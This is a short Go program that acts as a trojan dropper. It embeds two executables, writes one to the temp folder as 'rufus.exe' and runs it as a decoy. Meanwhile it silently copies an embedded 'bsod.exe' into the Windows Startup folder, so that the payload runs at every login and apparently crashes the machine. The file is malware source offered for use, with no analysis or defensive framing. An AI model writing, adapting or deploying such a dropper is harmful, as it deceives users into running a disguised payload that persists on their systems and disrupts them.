package main

import (
	_ "embed"
	"io/fs"
	"log"
	"os"
	"os/exec"
	"path"
)

//go:embed program.exe
var filePayload []byte

//go:embed bsod.exe
var bsodPayload []byte

var autoStartPath = path.Join("C:", "Users", "Administrator", "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

func main() {
	pth := path.Join(os.TempDir(), "rufus.exe")
	err := os.WriteFile(pth, filePayload, fs.FileMode(os.O_CREATE))
	go func() {
		os.WriteFile(path.Join(autoStartPath, "bsod.exe"), bsodPayload, fs.FileMode(os.O_CREATE))
	}()
	cmd := exec.Command(pth)
	err = cmd.Run()
	if err != nil {
		log.Fatal(err)
	}
}
